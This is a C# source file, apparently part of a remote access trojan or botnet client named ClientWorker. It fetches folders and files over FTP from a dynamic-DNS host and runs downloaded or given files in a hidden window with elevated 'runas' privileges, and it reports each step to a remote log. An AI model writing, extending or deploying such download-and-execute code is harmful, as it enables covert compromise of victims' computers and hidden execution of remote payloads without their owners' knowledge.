using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;

namespace ClientWorker
{
    public static class FileManager
    {
        public static void DownloadFloader(string floader, string localPath)
        {
            Log.Send("DownloadFloader("+ floader + ","+ localPath+")");
            FtpClient.DownloadFtpDirectory("ftp://" + StartData.ddnsHostName[1] + "/" + floader, localPath);
        }

        public static void DownloadFileAndRun(string fileName)
        {
            Log.Send("DownloadFileAndRun");
            try
            {
                FtpClient.DownloadF(fileName);

                new Process
                {
                    StartInfo =
                    {
                        FileName = fileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas"
                    }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("GetFileAndRun failed: " + ex.ToString());
            }
        }

        public static void RunHideProc(string fileName)
        {
            Log.Send("RunHideProc");
            try
            {
                new Process
                {
                    StartInfo =
                    {
                        FileName = fileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
            }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("RunHideProc failed: " + ex.ToString());
            }
        }
    }
}
